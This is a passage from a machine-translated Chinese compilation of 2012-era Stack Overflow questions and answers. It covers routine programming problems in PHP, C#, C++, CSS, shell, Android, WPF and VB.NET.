我个人认为这很疯狂，他们不只是尝试一个公共端口#，然后从那里开始工作，因此不仅对于给定的用户，而且在用户之间都有一致性。这将使与同事共享本地帮助链接成为可能。

我发现这篇关于运行独立信息中心的[帮助文章](http://help.eclipse.org/indigo/index.jsp?topic=%2Forg.eclipse.platform.doc.isv%2Fguide%2Fua_help_setup_infocenter.htm)说你可以 -port，但这似乎不适用于 Eclipse 本身（我尝试将它添加到 eclipse.ini）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-18T23:21:35.810

在当前的开普勒版本中，它可以通过添加来更改

```
-vmargs
-Dserver_port=8089 
```

在 config.ini 中

# php - 区分子域和子目录

> ID：12429646
> 
> 赞同：2
> 
> 时间：2012-09-14T17:58:19.543
> 
> 标签：php, subdomain, subdirectory

我有一个非常定制的网站，设置在子域上；**sitename.domain.com**并且它有一些页面（对于所有子域都相同）**sitename.domain.com/this-page**。每个站点都有“/this-page”。

我们有人对使用我们开发的一些东西感兴趣，但他们对使用子目录很感兴趣；**domain.com/sitename**当然也有**domain.com/sitename/this-page**。

我的问题是，我有一些代码

```
$sN = 'http://www.' . $_SERVER['HTTP_HOST'];
$PAGE = $sN . '/this-page/'; 
```

*   但当然这不适用于子目录安装（它寻找**domain.com/this-page/**而不是**domain.com/sitename/this-page**

有没有办法区分子域和子目录？

```
$setup = "GET THE HOME PAGE, REGARDLESS OF SETUP"
if($setup ( CONTAINS www.X.X.com)) { //do the code above }
else if ($setup ( CONTAINS www.X.com/X)) { //do different code } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T18:06:24.327

**[编辑]**尝试了[http://www.php.net/manual/en/reserved.variables.server.php#100881](http://www.php.net/manual/en/reserved.variables.server.php#100881)的解决方案，但对我不起作用，所以我这样做了：

```
<?php
$sitename = 'sitename';
if (strpos($_SERVER['HTTP_HOST'],$sitename)!==false){
    echo 'you are in http://'.$_SERVER['HTTP_HOST'] . '/'; 
 // you are in http://sitename.domain.com/
} else {
    $path = explode('/',$_SERVER['PHP_SELF']);
    unset ($path[count($path)-1]);
    echo 'you are in http://' . $_SERVER['HTTP_HOST'] . implode('/',$path) .'/'; 
 // you are in http://www.domain.com/sitename/
}
?> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T19:14:31.523

@elcodedocle 的答案是这样做的更好方法。虽然他们想出了那个解决方案，但我最终也得到了一个（更糟糕的）解决方案。

```
//Let's grab the current url for other uses
$cur = 'http://www.' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];

//Is this subdomains or subdirectories?
$TYPE = explode('.', $cur);
if(isset($TYPE[3])){
    //Yay! It's subdomains! not stupid subdirectories! 
    $this_root = 'http://www.' . $_SERVER['HTTP_HOST'];

} else {
    //Boo.... It's stupid subdirectories....  ;o(
    $chunks = explode('/', $TYPE[2]);
    $this_root = 'http://www.' .$TYPE[1]. '.' .$chunks[0]. '/' .$chunks[1];
}
?> 
```

这也有效，但它是一个不太优雅的解决方案。我最终使用了上面代码的略微修改版本，但对于那些想知道的人来说，这就是我在重新加载 SO 之前到达那里的方式。:)

# javascript - Windows 窗体 Web 浏览器控件和 Javascript 更改的 DOM

> ID：12429648
> 
> 赞同：2
> 
> 时间：2012-09-14T17:58:25.063
> 
> 标签：javascript, windows, winforms, browser

windows forms网页浏览器控件支持Javascript；这个 Javascript 可以对 DOM 进行更改。但是，当我调用 DocumentText 属性时，我总是得到未修改的 HTML。*修改后*有什么方法可以获取HTML ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-21T18:19:04.473

你应该能够做到：`webBrowser1.Document.Body.InnerHtml`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-23T03:42:47.603

当您修改 html 文档时，它是表单元素还是其他类型的元素。

我在调试过程中注意到的一件事是，当我将 setAttribute 用于输入表单然后使用`webbrowser1.document.innerText`时，我会返回修改后的文档。

我的建议是，您要么先设置要通过代码修改的 html doc 属性，要么使用`webbrowser1.document.body.innerText`

# jquery - 使用 CSS3 的 Flash 动画效果

> ID：12429650
> 
> 赞同：0
> 
> 时间：2012-09-14T17:58:30.910
> 
> 标签：jquery, css, css-animations

我想在 CSS3 中实现一些动画，其效果类似于在 Flash 中编码的效果。我一直在寻找一些看起来像电影片头字幕的效果，当电影在后台播放时，字幕不断显示在屏幕的各个位置。唯一的事情不是在这里使用电影，而是我想使用图像。寻找这样的东西：[Madmanimation](http://stuffandnonsense.co.uk/content/demo/madmanimation/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T18:09:40.160

您需要使用关键帧和转换来研究 CSS3 动画。 [从这里开始](http://www.w3schools.com/css3/css3_animations.asp)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-15T07:38:47.493

我刚刚做[的一个非常简单的例子。](http://dabblet.com/gist/3726572)

HTML：

```
<h1>That's all!</h1>
<div class='bg'><h3>Pencil Nebula</h3></div>
<div class='bg'><h3>N44 in the Large Magellanic Cloud</h3></div>
<div class='bg'><h3>Messier 83: Central Region</h3></div>
<div class='bg'><h3>Dark Matter</h3></div> 
```

CSS：

```
h1 {
    margin-top: 7em;
    color: transparent;
    text-align: center;
    animation: endani 1s 17s forwards;
}
.bg, h3 { position: absolute; }
.bg {
    top: 0; right: 0; bottom: 0; left: 0;
    background-position: 50% 50%;
    background-size: cover;
    opacity: 0;
}
.bg:first-of-type {
    background-image: 
        url(http://i.space.com/images/i/21536/wW4/pencil-nebula-wide-1920.jpg);
    animation: bgani 5s;
}
.bg:nth-of-type(2) {
    background-image: 
        url(http://i.space.com/images/i/20755/wW4/N44-Large-Magellanic-Cloud.jpg);
    animation: bgani 5s 4s;
}
.bg:nth-of-type(3) {
    background-image: 
        url(http://i.space.com/images/i/20683/wW4/eso-messier-83.jpg);
    animation: bgani 5s 8s;
}
.bg:nth-of-type(4) {
    background-image: 
        url(http://i.space.com/images/i/15679/wW4/hubble-cluster-abell-520.jpg);
    animation: bgani 5s 12s;
}
h3 {
    padding: .2em .8em;
    background: rgba(0,0,0,.65);
    color: white;
}
.bg:first-of-type h3 { top: 25%; left: 15%; }
.bg:nth-of-type(2) h3 { bottom: 25%; right: 15%; }
.bg:nth-of-type(3) h3 { top: 25%; right: 15%; }
.bg:nth-of-type(4) h3 { bottom: 25%; left: 15%; }

@keyframes bgani { 
    0% { opacity: 0; } 20% { opacity: 1; }
    95% { opacity: 1; } 100% { opacity: 0 }
}

@keyframes endani { to { color: crimson; text-shadow: 0 0 2px white; } } 
```

这个使用了四个元素（一个在另一个之上显示），它们的不透明度动画（您通过将其从 0 更改为 1 来淡入要显示的元素，并通过将其从更改`opacity`来淡出要隐藏的元素`opacity`1 到 0），但还有许多其他选项，例如动画`scale`变换（将要消失的元素缩放到 0，要出现的元素从 0 缩放到 1）或动画///值以`top`移动元素屏幕上和屏幕外。`right``bottom``left`

此外，您可以只拥有一个具有多个背景的元素，然后对其进行动画`background-size`处理`background-position`（这严格用于切换图像，您必须将不断变化的文本与不断变化的图像同步......或者让它们不同步以获得更混乱的效果） .

# c# - 获取 CheckBoxList 项值

> ID：12429655
> 
> 赞同：11
> 
> 时间：2012-09-14T17:58:54.567
> 
> 标签：c#, winforms, checklistbox

我有一个 CheckBoxList 我正在填充数据。当我尝试从列表中检索选中的项目时，我只能获取项目序号，我无法获取值。

我读过你可以使用 Items[i].Value 但是当我尝试这样做时，我收到一个错误，指出没有扩展方法'value'。

这是我用来尝试获取信息的代码（注意 GetItemText(i) 实际上只给了我项目的位置，而不是项目的文本）

```
 private void btnGO_Click(object sender, EventArgs e)
{
    for (int i = 0; i < chBoxListTables.Items.Count; i++)
    {
        if (chBoxListTables.GetItemChecked(i))
        {
            string str = chBoxListTables.GetItemText(i);
            MessageBox.Show(str);

            //next line invalid extension method
            chBoxListTables.Items[i].value;
        }
    }
} 
```

这是使用.Net 4.0

任何想法将不胜感激......谢谢

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-09-18T22:26:47.663

这最终变得非常简单。chBoxListTables.Item[i] 是一个字符串值，显式转换允许将其加载到变量中。以下代码有效：

```
private void btnGO_Click(object sender, EventArgs e)
{
    for (int i = 0; i < chBoxListTables.Items.Count; i++)
    {
          if (chBoxListTables.GetItemChecked(i))
        {
            string str = (string)chBoxListTables.Items[i];
            MessageBox.Show(str);
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-14T18:10:58.780

尝试使用这个。

```
 for (int i = 0; i < chBoxListTables.Items.Count; i++)
        {
            if (chBoxListTables.Items[i].Selected)
            {
                string str = chBoxListTables.Items[i].Text;
                MessageBox.Show(str);

                var itemValue = chBoxListTables.Items[i].Value;
            }
        } 
```

“V”值应使用大写字母。

这是 WinForm 应用程序中使用的另一个代码示例，并且运行正常。

```
 var chBoxList= new CheckedListBox();
        chBoxList.Items.Add(new ListItem("One", "1"));
        chBoxList.Items.Add(new ListItem("Two", "2"));
        chBoxList.SetItemChecked(1, true);

        var checkedItems = chBoxList.CheckedItems;
        var chkText = ((ListItem)checkedItems[0]).Text;
        var chkValue = ((ListItem)checkedItems[0]).Value;
        MessageBox.Show(chkText);
        MessageBox.Show(chkValue); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2017-02-05T19:29:38.990

要检查项目，您可以使用`CheckedItems`或`GetItemsChecked`。我在 .NET 4.5 中尝试了以下代码

遍历`CheckedItems`集合。这将为您提供已检查项目列表中的项目编号，而不是整个列表。因此，如果列表中的第一项未选中而第二项已选中，则下面的代码将显示类似`Checked Item 1 = MyListItem2`.

```
//Determine if there are any items checked. 
if(chBoxListTables.CheckedItems.Count != 0)  
{
    //looped through all checked items and show results.
    string s = "";
    for (int x = 0; x < chBoxListTables.CheckedItems.Count; x++)
    {
        s = s + (x + 1).ToString() + " = " + chBoxListTables.CheckedItems[x].ToString()+ ", ";
    }
    MessageBox.Show(s);//show result
} 
```

**-或者-**

单步执行 Items 集合并`GetItemChecked`为每个项目调用方法。这将为您提供整个列表中的项目编号，因此如果未选中列表中的第一个项目而选中第二个项目，它将显示类似`Item 2 = MyListItem2`.

```
int i;  
string s;   
s = "Checked items:\n" ;  
for (i = 0; i < checkedListBox1.Items.Count; i++)  
{  
   if (checkedListBox1.GetItemChecked(i))  
   {  
      s = s + "Item " + (i+1).ToString() + " = " + checkedListBox1.Items[i].ToString() + "\n";  
   }  
}  
MessageBox.Show (s); 
```

希望这可以帮助...

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-05-05T17:42:48.353

//简单示例代码：

```
foreach (var item in YourCheckedListBox.CheckedItems)
{List<string>.Add(item);} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-12-07T19:03:31.797

你可以试试这个： -

```
string values = "";
foreach(ListItem item in myCBL.Items){
if(item.Selected)
{
values += item.Value.ToString() + ",";  
}
}
values = values.TrimEnd(',');  //To eliminate comma in last. 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-09-12T18:25:10.037

而不是这个：

```
CheckboxList1.Items[i].value; 
```

试试这个：

```
CheckboxList1.Items[i].ToString(); 
```

它对我有用:)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2015-01-05T07:58:12.517

尝试使用这个：

```
 private void button1_Click(object sender, EventArgs e)
    {

        for (int i = 0; i < chBoxListTables.Items.Count; i++)
            if (chBoxListTables.GetItemCheckState(i) == CheckState.Checked)
            {
               txtBx.text += chBoxListTables.Items[i].ToString() + " \n"; 

            }
    } 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2018-03-11T12:18:44.347

您可以初始化一个字符串列表并添加那些被选中的项目。

请检查代码，对我来说很好。

```
List<string> modules = new List<string>();

foreach(ListItem s in chk_modules.Items)
{
    if (s.Selected)
    {
         modules.Add(s.Value);
    }
} 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2021-02-11T22:43:16.713

这将为您解决问题：

```
foreach (int indexChecked in checkedListBox1.CheckedIndices)
{
    string itemtxt = checkedListBox11.Items[indexChecked];
} 
```

它将返回选中列表框项中的任何字符串值。

# c++ - JsonCpp：未定义的对 `Json::Value::operator[](int) const' 的引用

> ID：12429657
> 
> 赞同：3
> 
> 时间：2012-09-14T17:59:07.760
> 
> 标签：c++, json

我正在尝试将 JsonCpp 与此示例代码一起使用

```
string json_example = "{\"array\":[\"item1\", \"item2\"], \"not an array\":\"asdf\"}";

    // Let's parse it
    Json::Value root;
    Json::Reader reader;

    //Parsing of something. In example do parsing of json_example string.
    bool parsedSuccess = reader.parse(json_example, root, false);

    if (!parsedSuccess) {
        // report to the user the failure and their locations in the document.
        cout  << "Failed to parse JSON" << endl << reader.getFormatedErrorMessages() << endl;
        return 1;
    }

    // Let's extract the array that is contained inside the root object
    const Json::Value array = root["array"];

    // And print its values
    for (int index = 0; index < array.size(); ++index) {   // Iterates over the sequence elements.
        cout << "Element " << index << " in array: " << array[index].asString() << endl;
    }

    // Lets extract the not array element contained in the root object and print its value
    cout << "Not an array: " << root["not an array"] << endl;

    // If we want to print JSON is as easy as doing:
    cout << "Json Example pretty print: " << endl << root.toStyledString() << endl;

    return 0; 
```

但我在这个“..array[index].asString...”上收到了这个错误

```
Undefined reference to `Json::Value::operator[](int) const' 
```

谁能帮帮我？！tnx 这么多

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-15T14:42:40.490

Tnx 为您解答...所以解决方案正在改变这一点

```
 for (int index = 0; index < array.size(); ++index) {   // Iterates over the sequence elements.
    cout << "Element " << index << " in array: " << array[index].asString() << endl;
} 
```

和

```
 for (unsigned int index = 0; index < array.size(); ++index) {   // Iterates over the sequence elements.
    cout << "Element " << index << " in array: " << array[index].asString() << endl;
} 
```

再见

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-10-10T13:32:41.307

我认为您没有包含 jsoncpp.cpp 文件，该文件描述了您的 json.h 库文件。您必须使用带有命令的 Pythot 生成它`python amalgamate.py`，然后将其包含到您的项目中

# php - PHP 移动重定向协助

> ID：12429659
> 
> 赞同：0
> 
> 时间：2012-09-14T17:59:19.617
> 
> 标签：php, redirect, mobile

我是一名网站管理员，目前正在努力添加几个页面的更简单版本，以便为移动浏览器创建一个子站点。因此，我希望将整个站点重定向到移动站点，以便用户在移动设备上浏览，并且我更喜欢使用 PHP 来执行此操作。我找到的那个有很好的评论，但我无法让它发挥作用。每次查看已发布的索引页面（这是一个 php 文件）时，我都会收到：

> 致命错误：在第 4 行的 D:\Hosting\4872190\html\php\index.php 中找不到类“Mobile_Detect”

在目录中，我有以下文件和文件夹：index.php、mobile（文件夹）、mobilehome.php（在手机中）、events.php（在手机中）、news.php（在手机中）。

显然，用户将输入该站点的主 URL，该 URL 将加载 index.php，并且该文件将在发现移动浏览器时将他们重定向到 mobile/mobilehome.php。

下面是两个文件的内容供参考：index.php 和 mobile_detect.php（我作为 PHP 类的一部分下载的）。

索引.php

```
<?
include 'mobile_detect.php';
$detect = new Mobile_Detect;

if(!$_SESSION['isMobile']){
$_SESSION['isMobile'] = $detect->isMobile();
}

if($detect->isMobile()){
header('mobilehome.php', true, 301);
}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"          
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />... 
```

您可以通过单击下面的 URL 查看我下载的 mobile_direct.php 类的代码。

[http://www.troop322dc.com/php/mobile_redirect.html](http://www.troop322dc.com/php/mobile_redirect.html)

是什么导致了问题？任何帮助将不胜感激。非常感谢您提前。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T18:03:49.287

它正在寻找/期望 mobile_detect.php 与 index.php 位于同一目录中。如果它实际上在 html/php/mobile/ 中，那么你想做`include 'mobile/mobile_detect.php';`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T18:39:30.287

确实如此，重新检查文件树，看看 mobile_detect.php 是否在同一级别。请记住，还要在文件开头开始会话。

# shell - 从一个命令获取两个正则表达式匹配

> ID：12429663
> 
> 赞同：0
> 
> 时间：2012-09-14T17:59:23.003
> 
> 标签：shell

我需要从一个大的讨厌的 ps 字符串中解析一些信息。我需要获取用户名和 PID，然后将 /usr/user/java.instanceName/ 部分放在一行中。

我尝试了 grep、sed 和 awk，但我不太了解它们中的任何一个。在为这个简单的任务阅读了几个小时之后，我希望有人可以快速敲出一条线。

这是我在询问之前尝试的最后一件事：

```
ps auxwww | sed 's/^[a-z]* *[0-9]*//g;s/\/usr\/user\/[a-z._0-9]*//g' 
```

这是 ps auxwww 命令的标准输出：

> 根 3837 2.5 32.5 4697784 2657720 ？Sl Sep13 30:23 /usr/java/jdk16/bin b.WebService.port=80 -Dorg.jboss.naming.NamingService.port=90 -Dorg.jboss.na mi.port=90 -Dorg.jboss.invocation。 jrmp.server.JRMPInvoker.port=40 -Dorg.jbos server.PooledInvoker.port=41 -Dorg.jboss.remoting.transport.Connector.port=42 ing.transport.Connector.messaging.port=180 -Dorg.jboss。 remoting.transport.Conn 1 -Djboss.bind.address=10.0.0.1 -Dtomcat.bind.address=10.0.0.1 -Dtomca cat.https.port=443 -Djava.net.preferIPv4Stack=true
> che.cluster.name=cluster =INVALIDATION_ASYNC
> cache.mcast.port=457 -Dejb3.cache.mode=LOCAL -Dejb3.cache.cluster.name=EJB3-en ss.platform.mbeanserver -Djavax.management.builder.initial=org.jboss.system.serv ilderImpl -服务器 -Dsun.security.ssl.allowUnsafeRenegotiatio
> ed.dirs=/usr/user/java.instanceName/lib/endorsed -Dsun.rmi.dgc.client.gcInte mi.dgc.server.gcInterval=3600000 -Djavax.net.ssl .trustStore=/usr/java/jdk16/jre/ -Djavax.net.ssl.trustStorePassword=pass123 -Djavax.net.ssl.trustStoreType=JKS pGC -XX:+CMSClassUnloadingEnabled -XX:+CMSPermGenSweepingEnabled -XX:+UseParNewG m - XX:PermSize=512m -XX:MaxPermSize=512m -jar run.jar -c jvmname -b 10.0.1.1

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T18:48:38.473

我认为这应该有效：

```
ps auxww | sed -n -e '/java.instanceName/s;\(^[a-z]* *[0-9]*\).*\(/usr/user/java.instanceName[A-Za-z._0-9/]*\) .*;\1 \2;p' 
```

分解如下：`sed -n`关闭每一行的默认打印操作；`/java.instanceName/`只会选择其中包含该模式的行；该`s`命令`;`用作分隔符，因为`/`稍后在模式中使用；`\(^[a-z]* *[0-9]*\)`就像您拥有的那样，并在行首匹配用户和 PID，但具有精确保存匹配内容的额外效果；然后我们跳过所有内容，直到`\(/usr/user/...[A-Za-z._0-9/]*\)`匹配前缀为`/usr/user/`（我调整了字符类以包括大写和`/`）的路径 - 保存以备将来使用；最后，该路径之后的空间和其他所有内容都匹配了。该`;\1 \2;p`部分用我们保存的两个子部分替换整个匹配并将其打印出来。

# android - listview 在一个块中只显示一个值

> ID：12429667
> 
> 赞同：1
> 
> 时间：2012-09-14T17:59:30.383
> 
> 标签：android, database, listview

我有一个列表视图，它的数据值由块（Item1，Item2...）分隔，但我想知道如何显示（Item 1，Sub Item 1...）？那么这里是只显示项目的代码，那么我如何显示项目和子项目呢？

代码：

```
 //LISTVIEW database CONTATO
    ListView user = (ListView) findViewById(R.id.lvShowContatos);
    //String = simple value ||| String[] = multiple values/columns
    String[] campos = new String[] {"nome", "telefone"};

    list = new ArrayList<String>();
    Cursor c = db.query( "contatos", campos, null, null, null, null, "nome" + " ASC ");
    c.moveToFirst();
    String lista = "";
    if(c.getCount() > 0) {
        while(true) {
           list.add(c.getString(c.getColumnIndex("nome")).toString());
            if(!c.moveToNext()) break;
        }
    }

    ArrayAdapter<String> adapter = new ArrayAdapter<String>(this,
            android.R.layout.simple_list_item_1, list);

    user.setAdapter(adapter); 
```

我放在那里的代码但仍然给我错误，我还没有看到它从哪里获取值。

```
 //LISTVIEW database CONTATO
    ListView user = (ListView) findViewById(R.id.lvShowContatos);
    //String = simple value ||| String[] = multiple values/columns
    String[] campos = new String[] {"nome", "telefone"};

    ArrayList<HashMap<String, Object>> items = new ArrayList<HashMap<String,Object>>();
    HashMap<String, Object> listItem;

    Cursor c = db.query( "contatos", campos, null, null, null, null, "nome" + " ASC ");
    c.moveToFirst();

    listItem = new HashMap<String, Object>();
    listItem.put("nome", "your_item_text");
    listItem.put("telefone", "your_subitem_text");
    items.add(listItem);

    adapter = new SimpleAdapter(this, items, R.layout.custom_list_layout, new String[]{"item", "subitem"}, new int[]{R.id.text_item, R.id.text_subitem});

    user.setAdapter(adapter); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T19:44:49.713

使用`SimpleAdapter`，而不是`ArrayAdapter`填充`ListView`： http: [//developer.android.com/reference/android/widget/SimpleAdapter.html](http://developer.android.com/reference/android/widget/SimpleAdapter.html) 在那里，您将有一个字段*数组*来填充每个项目，例如：

```
ArrayList<HashMap<String, Object>> items = new ArrayList<HashMap<String,Object>>();
HashMap<String, Object> listItem;

listItem = new HashMap<String, Object>();
listItem.put("item", "your_item_text");
listItem.put("subitem", "your_subitem_text");
items.add(listItem);

adapter = new SimpleAdapter(this, items, R.layout.custom_list_layout, new String[]{"item", "subitem"}, new int[]{R.id.text_item, R.id.text_subitem});

listview.setAdapter(adapter); 
```

还要记住`custom_list_layout.xml`为您的 ListView 项目创建，并确保它包含具有正确 id 的 textView：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:orientation="horizontal" >

    <TextView
        android:id="@+id/text_item"
        ... />

    <TextView
        android:id="@+id/text_subitem"
        ... />

</RelativeLayout> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T19:23:03.353

查看[ExpandableListView](http://developer.android.com/reference/android/widget/ExpandableListView.html)，这正是这个用户案例。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T19:42:57.387

您必须创建自己的自定义适配器来扩展 ArrayAdapter 或 BaseAdapter，并且还必须为列表中的项目创建 xml 布局。
如果您是 ListView 的新手，请阅读有关 ListView 的本[教程](http://www.mkyong.com/android/android-listview-example/)。

# c# - WPF Combobox 高亮在 Windows 8 中被破坏

> ID：12429675
> 
> 赞同：1
> 
> 时间：2012-09-14T18:00:27.500
> 
> 标签：c#, wpf, windows-8

这适用于窗口 7 上的 .net 4.0/4.5

```
<ComboBox HorizontalAlignment="Left"  VerticalAlignment="Top">
            <ComboBox.Resources>
                <SolidColorBrush x:Key="{x:Static SystemColors.HighlightBrushKey}">Red</SolidColorBrush>
            </ComboBox.Resources>
            <ComboBox.Items>
                <ComboBoxItem >ITem 1</ComboBoxItem>
                <ComboBoxItem >ITem 1</ComboBoxItem>
                <ComboBoxItem >ITem 1</ComboBoxItem>
                <ComboBoxItem >ITem 1</ComboBoxItem>

            </ComboBox.Items>
        </ComboBox> 
```

但在 Windows 8 上，我仍然可以看到操作系统的亮点。

有没有人知道解决方案？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-01T17:30:34.757

Windows 8 主题不使用系统颜色作为前景色/背景色，因此覆盖它们不再起作用。您现在必须指定一个自定义控件模板才能执行此操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T18:15:21.790

我没有Window8，但你可以试试这个看看是否有效 -

```
<SolidColorBrush x:Key="{x:Static SystemColors.HighlightBrushKey}">#FFFF0000
</SolidColorBrush> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T18:29:19.393

在 WPF 中，这些资源是动态的，取决于操作系统。也许这个Brush在Windows 8中有变化。如果是这种情况，那么你应该实现brush。希望这个回答对你有帮助...

# html - 使用 CSS 将两个标题彼此靠近对齐

> ID：12429677
> 
> 赞同：2
> 
> 时间：2012-09-14T18:00:43.643
> 
> 标签：html, css, text-alignment

我有两条线，它们之间有空格。就像下面那个......

```
 <h2> Something Something <h2>

 <h4> Something here too </h4> 
```

我希望它看起来像这样：

```
 <h2> Something Something <h2>
 <h4> Something here too </h4> 
```

该空间显示在浏览器中。我使用标签只是为了说明清楚。

![在此处输入图像描述](../Images/c9af44ed6e26bcd96d621c1408f5044c.png)

如何减少橙色矩形内的空间？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-14T18:07:16.970

首先，确保您的标题元素上的`padding`and为 0。`margin`

之后，您可以调整它们的`line-height`值以获得您喜欢的空间量。示例：http: [//jsbin.com/afivoq/4/edit](http://jsbin.com/afivoq/4/edit)

你的另一个选择！`margin-top`您可以在其他标题元素之后的标题元素上应用否定，如下所示：

```
h2 + h4 { margin-top: -20px; } 
```

请参阅 jsbin 以获取更新的示例。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T18:05:02.187

我将所有填充和边距设置为 0。

```
h4, h2 { padding:0; margin:0; } 
```

这很可能是对您的代码的过度简化，但它会完成工作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-14T18:05:41.217

将其添加到您的 CSS 中：

```
h2{
    margin-bottom: 10px; //something smaller
}
h4 {
    margin-top: 10px; //Whatever you like
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-14T18:12:59.583

您的第二个`<h2>`不是关闭标签`</h2>`，因此您添加了一个额外的 H2 元素。也看看[这个](http://cssdesk.com/fv9fE)安装了 Firebug 的例子。Firebug 有一个[名为 Layout](https://getfirebug.com/layout)的功能，它可以显示空间的来源：

![在此处输入图像描述](../Images/ac7085d390b49d9755acf48b3732bb20.png)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-14T18:20:17.660

像其他人所说的那样，重置页眉标签的边距和填充是一个很好的开始。我能给正在学习 CSS 的人的最好建议是获得 chrome。

右键单击要更改的元素，然后点击“检查元素”。在右侧，您可以动态更改 CSS。然后，您可以将结果复制并粘贴到您的应用程序中。Chrome 还可以保存您的 CSS 代码。

# iphone - iPhone - 基于触摸速度的路径宽度

> ID：12429683
> 
> 赞同：2
> 
> 时间：2012-09-14T18:01:23.407
> 
> 标签：iphone, ios, xcode, ipad, ipod

> **可能重复：**
> [使用 UIPanGestureRecognizer 的 velocityInView](https://stackoverflow.com/questions/9093544/making-use-of-velocityinview-with-uipangesturerecognizer)

我正在创建一个应用程序，在其中我基于 touchMoved 绘制路径。我想根据触摸速度来确定线的宽度。我可以达到这个效果，但是这里面没有平滑。

代码：

```
-(float) clampf:(float) v: (float) min: (float) max 
{
    if( v < min ) v = min;
    if( v > max ) v = max;

    return v;
}

- (float)extractSize:(UIPanGestureRecognizer *)panGestureRecognizer
{
    vel = [gesture velocityInView:self.view];
    mag = sqrtf((vel.x * vel.x) + (vel.y * vel.y)); // pythagoras theorem (a(square) + b(square) = c(square))
    final = mag/166.0f;
    final = [self clampf:final :1 :40];
    NSLog(@"%f", final);

    if ([velocities count] > 1) {
        final =  final * 0.2f + [[velocities objectAtIndex:[velocities count] - 1] floatValue] * 0.8f;
    }
    [velocities addObject:[NSNumber numberWithFloat:final]];
    return final;
} 
```

但我得到这样的东西：

![在此处输入图像描述](../Images/a8f6c002c3df3da4e44e1ab30f28ed2b.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T18:54:50.713

我之前也做过类似的效果。我正在使用原始的触摸事件方法（`touchesBegan`等）并自己计算速度。每件事看起来都很好。

我不确定`velocityInView`在用户移动手指期间该方法是否总是给您正确的结果，也许您应该尝试自己计算速度并查看问题是否消失。

# vb.net - 检测鼠标是否停止移动 vb.net

> ID：12429684
> 
> 赞同：1
> 
> 时间：2012-09-14T18:01:24.217
> 
> 标签：vb.net, events, timer, mouse, groupbox

`timer`每当鼠标停止在`groupbox`

截至目前，我在鼠标悬停在组框上时启动计时器，并在它离开组框时停止它。

```
Private Sub gbxMouseMap_MouseHover(sender As Object, e As System.EventArgs) Handles gbxMouseMap.MouseHover
    Timer.Start()
End Sub

Private Sub gbxMouseMap_MouseLeave(sender As Object, e As System.EventArgs) Handles gbxMouseMap.MouseLeave
    Timer.Stop()
End Sub 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T18:54:46.603

在 MouseMove 事件中，将名为*LastMoveTime*的类变量设置为当前计时器经过的时间。在 MouseHover 事件中检查*LastMoveTime*是否已达到超时期限，如果是则停止计时器。

我会让你开始...

```
Private LastMoveTime As DateTime
Private MouseTimeoutMilliseconds as Integer = 500 

'put inside hover

If  LastMoveTime.AddMilliseconds(MouseTimeoutMilliseconds) < Now Then
 Timer.Stop()
Else
 Timer.Start()
End if 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-03-15T20:27:17.340

为了避免必须为许多控件处理此问题，您可以稍微重新安排一些内容并缓存需要了解光标是否已移动以及空闲时间多长时间所需的信息，为此您需要一个 Point 变量和一个 Date 变量。计时器需要一直滴答作响。此外，为了平衡光标显示/隐藏调用，您需要一个变量来跟踪其可见性状态。这是完整的代码示例：

`Private loc As Point, idle As Date, hidden As Boolean`, `Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick If loc <> Cursor.Position Then If hidden Then Cursor.Show() hidden = False End If loc = Cursor.Position idle = Date.Now ElseIf Not hidden AndAlso (Date.Now - idle).TotalSeconds > 3 Then` `Cursor.Hide() hidden = True End If End Sub`

此计时器可以根据您想要的响应速度每 1/2-1 秒打勾，空闲时间设置为 3 秒。当您阅读代码并考虑一下时，代码应该很容易理解，如果不问的话

# c++ - 继承 - C++

> ID：12429686
> 
> 赞同：1
> 
> 时间：2012-09-14T18:01:29.053
> 
> 标签：c++, inheritance

我正在使用一个类说**baseClass**，我从中派生了另一个类**derivedClass**。我有一个问题定义，除了其他问题之外：

